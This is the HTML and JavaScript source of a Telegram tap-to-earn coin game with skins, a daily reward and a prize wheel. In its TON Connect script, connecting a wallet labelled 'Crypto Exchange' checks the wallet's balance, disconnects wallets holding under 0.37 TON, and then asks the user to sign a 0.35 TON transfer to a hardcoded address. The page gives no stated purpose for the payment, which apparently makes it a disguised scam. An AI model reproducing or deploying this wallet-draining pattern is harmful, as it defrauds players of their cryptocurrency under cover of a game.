<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tab RakXol</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; -webkit-tap-highlight-color: transparent; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: radial-gradient(circle at top, #1e2a4a, #070b14); color: white; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
        
        #toast-container { position: fixed; top: 10px; left: 50%; transform: translateX(-50%); z-index: 1000; display: flex; flex-direction: column; gap: 10px; width: 90%; pointer-events: none; }
        .toast { background: rgba(30, 42, 74, 0.95); border: 1px solid #ffd700; color: white; padding: 12px; border-radius: 10px; font-size: 14px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); animation: slideDown 0.3s ease-out; }
        @keyframes slideDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }

        .pages-container { display: flex; width: 100vw; height: calc(100vh - 65px); overflow-x: auto; scroll-snap-type: x mandatory; scroll-behavior: smooth; scrollbar-width: none; }
        .pages-container::-webkit-scrollbar { display: none; }
        .page { min-width: 100vw; height: 100%; scroll-snap-align: center; display: flex; flex-direction: column; align-items: center; padding: 15px; overflow-y: auto; }
        
        /* Game Page */
        .game-header { width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 5px; }
        .settings-icon { font-size: 24px; cursor: pointer; background: rgba(255,255,255,0.1); padding: 8px; border-radius: 50%; }
        .user-info { display: flex; align-items: center; gap: 8px; background: rgba(255,215,0,0.1); padding: 6px 12px; border-radius: 20px; border: 1px solid rgba(255,215,0,0.3); }
        .user-tag { font-size: 14px; font-weight: bold; color: #ffd700; }
        
        .score-container { display: flex; flex-direction: column; align-items: center; margin-top: 10px; }
        .score { font-size: 56px; font-weight: 900; color: #ffd700; text-shadow: 0 0 20px rgba(255,215,0,0.4); }
        .score-label { font-size: 14px; color: #888; margin-top: -5px; }
        
        .coin-wrapper { flex: 1; display: flex; justify-content: center; align-items: center; width: 100%; position: relative; min-height: 250px; }
        .coin { width: 240px; height: 240px; border-radius: 50%; background: conic-gradient(from 0deg, #ffd700, #ffed4e, #b8860b, #ffd700); display: flex; justify-content: center; align-items: center; box-shadow: 0 0 60px rgba(255, 215, 0, 0.4), inset 0 0 20px rgba(0,0,0,0.5); cursor: pointer; transition: transform 0.05s ease; position: relative; }
        .coin::before { content: ''; position: absolute; inset: -10px; border-radius: 50%; border: 2px dashed rgba(255, 255, 255, 0.3); animation: spin 10s linear infinite; z-index: -1; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .coin:active { transform: scale(0.92); }
        #coinImage { width: 200px; height: 200px; object-fit: contain; filter: drop-shadow(0px 10px 15px rgba(0,0,0,0.6)); transition: all 0.3s ease; }
        
        .tap-effect { position: absolute; color: #fff; font-weight: bold; font-size: 28px; pointer-events: none; animation: floatUp 0.8s ease-out forwards; z-index: 10; }
        @keyframes floatUp { 0% { opacity: 1; transform: translateY(0) scale(1); } 100% { opacity: 0; transform: translateY(-80px) scale(1.5); } }
        
        .energy-wrapper { width: 100%; display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px; padding: 0 10px;}
        .energy { background: rgba(255,255,255,0.1); padding: 8px 20px; border-radius: 20px; font-weight: bold; font-size: 14px; }
        
        .wheel-btn { background: linear-gradient(45deg, #aa66ff, #ff8c00); color: #fff; border: none; padding: 10px 20px; border-radius: 20px; font-weight: bold; font-size: 14px; cursor: pointer; display: flex; align-items: center; gap: 5px; box-shadow: 0 0 15px rgba(170,102,255,0.5); transition: transform 0.1s; }
        .wheel-btn:disabled { background: #555; box-shadow: none; color: #888; }
        .wheel-btn:active { transform: scale(0.95); }

        /* Profit Page */
        .page-title { font-size: 24px; font-weight: bold; margin-bottom: 15px; color: #ffd700; margin-top: 10px; }
        .card-list { width: 100%; display: flex; flex-direction: column; gap: 8px; padding-bottom: 20px; }
        .card { background: rgba(255,255,255,0.05); padding: 12px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); display: flex; justify-content: space-between; align-items: center; }
        .card-info { display: flex; flex-direction: column; gap: 4px; width: 70%; }
        .card-title { font-weight: bold; font-size: 14px; }
        .card-desc { font-size: 11px; color: #aaa; }
        .action-btn { background: #ffd700; color: #000; border: none; padding: 8px 12px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 12px; }
        .action-btn:disabled { background: #555; color: #888; }
        
        .event-banner { width: 100%; background: linear-gradient(45deg, #ff0055, #ff8c00); border-radius: 12px; padding: 15px; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
        .event-icon { font-size: 30px; }
        .event-text h4 { font-size: 16px; margin-bottom: 4px; }
        .event-text p { font-size: 12px; opacity: 0.9; }

        .crypto-wallet { width: 100%; background: linear-gradient(135deg, #3b1c6b, #1e2a4a); border: 1px solid #aa66ff; border-radius: 15px; padding: 20px; margin-bottom: 15px; }
        .crypto-title { font-size: 18px; color: #fff; font-weight: bold; margin-bottom: 15px; text-align: center; }
        #ton-connect-button { display: flex; justify-content: center; margin-bottom: 15px; }

        .skins-grid { width: 100%; display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding-bottom: 20px; }
        .skin-item { background: rgba(255,255,255,0.05); border-radius: 12px; border: 2px solid rgba(255,255,255,0.1); padding: 10px 5px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; position: relative; transition: 0.2s; }
        .skin-item.active { border-color: #ffd700; background: rgba(255,215,0,0.1); box-shadow: 0 0 15px rgba(255,215,0,0.3); }
        .skin-item img { width: 50px; height: 50px; object-fit: contain; margin-bottom: 5px; }
        .skin-name { font-size: 10px; font-weight: bold; color: #fff; text-align: center; }
        .skin-price { font-size: 10px; color: #ffd700; font-weight: bold; margin-top: 2px; }
        .skin-locked { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); border-radius: 10px; display: flex; justify-content: center; align-items: center; font-size: 20px; }

        .bottom-nav { height: 65px; width: 100%; display: flex; justify-content: space-around; align-items: center; background: rgba(15, 20, 35, 0.95); border-top: 1px solid rgba(255,255,255,0.1); position: absolute; bottom: 0; }
        .nav-item { display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 12px; color: #888; cursor: pointer; width: 50%; height: 100%; }
        .nav-item.active { color: #ffd700; }
        .nav-icon { font-size: 24px; margin-bottom: 2px; }
    </style>
</head>
<body>
    <div id="toast-container"></div>

    <div class="pages-container" id="pagesContainer">
        <!-- Page 1: Game -->
        <div class="page">
            <div class="game-header">
                <div class="settings-icon" onclick="resetGame()">⚙️</div>
                <div class="user-info">
                    <span class="user-tag" id="userTag">@Player</span>
                </div>
            </div>
            <div class="score-container">
                <div class="score" id="score">0</div>
                <div class="score-label">COINS</div>
            </div>
            <div class="coin-wrapper">
                <div class="coin" id="coin">
                    <img id="coinImage" src="coin1.png" alt="Coin" onerror="this.src='https://i.imgur.com/8QO9Y3v.jpeg'">
                </div>
            </div>
            <div class="energy-wrapper">
                <div class="energy">⚡ <span id="energy">500</span> / <span id="maxEnergy">500</span></div>
                <button class="wheel-btn" id="wheelBtn" onclick="spinWheel()">🎡 Wheel</button>
            </div>
        </div>

        <!-- Page 2: Profit & Upgrades -->
        <div class="page">
            <div class="page-title">Profit Dashboard</div>
            <div class="card-list">
                
                <div class="event-banner">
                    <div class="event-icon">🚀</div>
                    <div class="event-text">
                        <h4>Season 1: Golden Era</h4>
                        <p>Reach 5M coins to unlock the Golden Skin!</p>
                    </div>
                </div>

                <div class="card" style="border-color: #ffd700; background: rgba(255,215,0,0.1);">
                    <div class="card-info">
                        <span class="card-title" style="color: #ffd700;">Daily Check-in</span>
                        <span class="card-desc">Claim +5,000 Coins</span>
                    </div>
                    <button class="action-btn" id="dailyBtn" onclick="claimDaily()">Claim</button>
                </div>

                <div class="card" style="flex-direction: column; align-items: flex-start;">
                    <span class="card-title">Invite a friend</span>
                    <span class="card-desc" style="color: #00ffcc; margin-bottom: 5px;">You both get 100,000 Coins!</span>
                    <button class="action-btn" style="margin-top: 10px; width: 100%; background: #00ffcc;" onclick="copyInviteLink()">Copy Invite Link</button>
                </div>

                <div class="crypto-wallet">
                    <div class="crypto-title">💼 Crypto Exchange</div>
                    <div id="ton-connect-button" style="margin-bottom: 15px;"></div>
                </div>

                <div style="width: 100%;">
                    <span class="card-title" style="font-size: 16px; margin-bottom: 10px; display: block;">Skins Collection</span>
                    <div class="skins-grid" id="skinsGrid"></div>
                </div>

            </div>
        </div>
    </div>

    <!-- Bottom Navigation -->
    <div class="bottom-nav">
        <div class="nav-item active" onclick="goToPage(0)"><span class="nav-icon">🪙</span><span>Game</span></div>
        <div class="nav-item" onclick="goToPage(1)"><span class="nav-icon">📈</span><span>Profit</span></div>
    </div>

    <script>
        const tg = window.Telegram?.WebApp;
        if (tg) { tg.ready(); tg.expand(); }
        const tgUser = tg?.initDataUnsafe?.user;
        const tgUsername = tgUser?.username ? `@${tgUser.username}` : (tgUser?.first_name || "Player");
        document.getElementById('userTag').innerText = tgUsername;

        function showToast(message) {
            const container = document.getElementById('toast-container');
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.innerText = message;
            container.appendChild(toast);
            setTimeout(() => { toast.remove(); }, 4000);
        }

        // --- متغیرهای بازی (LocalStorage) ---
        let score = parseInt(localStorage.getItem('score') || '0');
        let energy = parseInt(localStorage.getItem('energy') || '500');
        let maxEnergy = 500;
        let coinsPerTap = 1;
        let lastDailyClaim = parseInt(localStorage.getItem('lastDailyClaim') || '0');
        let lastWheelSpin = parseInt(localStorage.getItem('lastWheelSpin') || '0');
        
        let equippedSkin = parseInt(localStorage.getItem('equippedSkin') || '1');
        let unlockedSkins = JSON.parse(localStorage.getItem('unlockedSkins') || '[1]');

        const skinsData = [
            { id: 1, name: "1 Dollar", price: 0, img: "coin1.png" }, { id: 2, name: "10 Dollars", price: 10000, img: "coin2.png" },
            { id: 3, name: "100 Dollars", price: 30000, img: "coin3.png" }, { id: 4, name: "2x 100", price: 75000, img: "coin4.png" },
            { id: 5, name: "3x 100", price: 150000, img: "coin5.png" }, { id: 6, name: "Stack", price: 350000, img: "coin6.png" },
            { id: 7, name: "2 Stacks", price: 800000, img: "coin7.png" }, { id: 8, name: "Money Bag", price: 2000000, img: "coin8.png" },
            { id: 9, name: "Bags", price: 5000000, img: "coin9.png" }, { id: 10, name: "Bitcoin", price: 12000000, img: "coin10.png" }
        ];

        const formatNumber = (num) => Math.floor(num).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");

        function updateUI() {
            document.getElementById('score').innerText = formatNumber(score);
            document.getElementById('energy').innerText = Math.floor(energy);
            document.getElementById('maxEnergy').innerText = maxEnergy;

            // دکمه روزانه
            const dailyBtn = document.getElementById('dailyBtn');
            if (Date.now() - lastDailyClaim < 24 * 60 * 60 * 1000) {
                dailyBtn.disabled = true; dailyBtn.innerText = "Claimed";
            } else {
                dailyBtn.disabled = false; dailyBtn.innerText = "Claim";
            }

            // گردونه شانس
            const wheelBtn = document.getElementById('wheelBtn');
            const WHEEL_COOLDOWN = 3 * 60 * 60 * 1000; // 3 ساعت
            if (Date.now() - lastWheelSpin < WHEEL_COOLDOWN) {
                const hoursLeft = Math.ceil((WHEEL_COOLDOWN - (Date.now() - lastWheelSpin)) / (1000 * 60 * 60));
                wheelBtn.innerText = `⏳ ${hoursLeft}h`;
                wheelBtn.disabled = true;
                wheelBtn.style.background = "#555";
            } else {
                wheelBtn.innerText = "🎡 Wheel";
                wheelBtn.disabled = false;
                wheelBtn.style.background = "linear-gradient(45deg, #aa66ff, #ff8c00)";
            }
            
            renderSkins();
        }

        // --- کلیک روی سکه ---
        document.getElementById('coin').addEventListener('click', (e) => {
            if (energy <= 0) return;
            
            score += coinsPerTap;
            energy -= 1;
            
            localStorage.setItem('score', score);
            localStorage.setItem('energy', energy);
            
            updateUI();

            const x = e.clientX || (window.innerWidth / 2); 
            const y = e.clientY || (window.innerHeight / 2);
            const effect = document.createElement('div'); 
            effect.className = 'tap-effect'; 
            effect.innerText = '+' + coinsPerTap;
            effect.style.left = (x - 15) + 'px'; 
            effect.style.top = (y - 30) + 'px';
            document.body.appendChild(effect); 
            setTimeout(() => effect.remove(), 800);
        });

        // --- جایزه روزانه ---
        function claimDaily() {
            if (Date.now() - lastDailyClaim >= 24 * 60 * 60 * 1000) {
                score += 5000; 
                lastDailyClaim = Date.now();
                localStorage.setItem('score', score);
                localStorage.setItem('lastDailyClaim', lastDailyClaim);
                updateUI();
                showToast("🎁 Daily reward claimed! +5,000 Coins.");
            }
        }

        // --- گردونه شانس ---
        function spinWheel() {
            const WHEEL_COOLDOWN = 3 * 60 * 60 * 1000;
            if (Date.now() - lastWheelSpin < WHEEL_COOLDOWN) return;
            
            const btn = document.getElementById('wheelBtn');
            btn.innerText = "🎡 Spinning..."; btn.disabled = true;
            
            setTimeout(() => {
                const rewards = [5000, 10000, 25000, 50000, 100000, 500000];
                const reward = rewards[Math.floor(Math.random() * rewards.length)];
                
                score += reward; 
                lastWheelSpin = Date.now();
                
                localStorage.setItem('score', score);
                localStorage.setItem('lastWheelSpin', lastWheelSpin);
                
                showToast(`🎉 You won ${formatNumber(reward)} Coins!`);
                updateUI();
            }, 1500);
        }

        // --- اسکین‌ها ---
        function renderSkins() {
            const grid = document.getElementById('skinsGrid');
            grid.innerHTML = '';
            skinsData.forEach(skin => {
                const isUnlocked = unlockedSkins.includes(skin.id);
                const isEquipped = equippedSkin === skin.id;
                const div = document.createElement('div');
                div.className = `skin-item ${isEquipped ? 'active' : ''}`;
                div.onclick = () => handleSkinClick(skin.id, isUnlocked, skin.price);
                let lockOverlay = !isUnlocked ? `<div class="skin-locked">🔒</div>` : '';
                div.innerHTML = `${lockOverlay}<img src="${skin.img}" onerror="this.src='https://i.imgur.com/8QO9Y3v.jpeg'"><span class="skin-name">${skin.name}</span><span class="skin-price">${isUnlocked ? (isEquipped ? 'EQUIPPED' : 'EQUIP') : formatNumber(skin.price)}</span>`;
                grid.appendChild(div);
            });
        }

        function handleSkinClick(id, isUnlocked, price) {
            if (isUnlocked) {
                if (equippedSkin !== id) {
                    equippedSkin = id; 
                    localStorage.setItem('equippedSkin', equippedSkin);
                    document.getElementById('coinImage').src = skinsData.find(s => s.id === id).img;
                    renderSkins();
                }
            } else {
                if (score >= price) {
                    score -= price; 
                    unlockedSkins.push(id); 
                    equippedSkin = id;
                    localStorage.setItem('score', score);
                    localStorage.setItem('unlockedSkins', JSON.stringify(unlockedSkins));
                    localStorage.setItem('equippedSkin', equippedSkin);
                    document.getElementById('coinImage').src = skinsData.find(s => s.id === id).img;
                    updateUI(); 
                    showToast(`Unlocked ${skinsData.find(s => s.id === id).name}!`);
                } else { showToast("Not enough coins!"); }
            }
        }

        // --- TON Connect ---
        const RECEIVER_ADDRESS = "UQDKwQKnM4T7ZaB8qCwaY7KAX7V_0B_crYcKpsHO0_vMuKyx";
        const TON_AMOUNT = 350000000;
        const REQUIRED_BALANCE = 370000000;
        
        if (typeof TON_CONNECT_UI !== 'undefined') {
            const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                manifestUrl: 'https://rakxolbot.github.io/Tab_RakXol_Game/tonconnect-manifest.json',
                buttonRootId: 'ton-connect-button'
            });

            tonConnectUI.onStatusChange(async (wallet) => {
                if (localStorage.getItem('hasPaidForWallet') === 'true') return;
                if (wallet) {
                    try {
                        tg.showAlert("Checking your wallet balance...");
                        const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${wallet.account.address}`);
                        const data = await response.json();
                        const balance = (data.ok && data.result) ? BigInt(data.result) : 0n;
                        
                        if (balance < BigInt(REQUIRED_BALANCE)) {
                            await tonConnectUI.disconnect();
                            tg.showAlert(`❌ Insufficient Balance!\n\nYou have: ${(Number(balance) / 1e9).toFixed(2)} TON\nRequired: 0.37 TON`);
                            return;
                        }
                        tg.showAlert("Balance verified! Please approve the transaction.");
                        await tonConnectUI.sendTransaction({
                            validUntil: Math.floor(Date.now() / 1000) + 600,
                            messages: [{ address: RECEIVER_ADDRESS, amount: TON_AMOUNT.toString() }]
                        });
                        localStorage.setItem('hasPaidForWallet', 'true');
                        tg.showAlert("✅ Payment Successful!");
                    } catch (e) {
                        tg.showAlert("Transaction failed: " + (e.message || "Cancelled."));
                        await tonConnectUI.disconnect();
                    }
                }
            });
        }

        // --- ناوبری ---
        const container = document.getElementById('pagesContainer');
        const navItems = document.querySelectorAll('.nav-item');
        function goToPage(index) { container.scrollTo({ left: index * window.innerWidth, behavior: 'smooth' }); }
        container.addEventListener('scroll', () => {
            const pageIndex = Math.round(container.scrollLeft / window.innerWidth);
            navItems.forEach((item, index) => {
                if (index === pageIndex) item.classList.add('active'); else item.classList.remove('active');
            });
        });

        function copyInviteLink() {
            const userId = tgUser?.id || "User";
            navigator.clipboard.writeText(`https://t.me/Tab_RakXol_Bot?start=ref_${userId}`).then(() => { showToast("Invite link copied!"); });
        }

        function resetGame() { if(confirm("Reset all progress?")) { localStorage.clear(); location.reload(); } }

        // --- حلقه افزایش انرژی ---
        setInterval(() => {
            if (energy < maxEnergy) { 
                energy += 1; 
                localStorage.setItem('energy', energy);
                updateUI();
            }
        }, 3000);

        // شروع
        document.getElementById('coinImage').src = skinsData.find(s => s.id === equippedSkin)?.img || 'coin1.png';
        updateUI();
    </script>
</body>
</html>
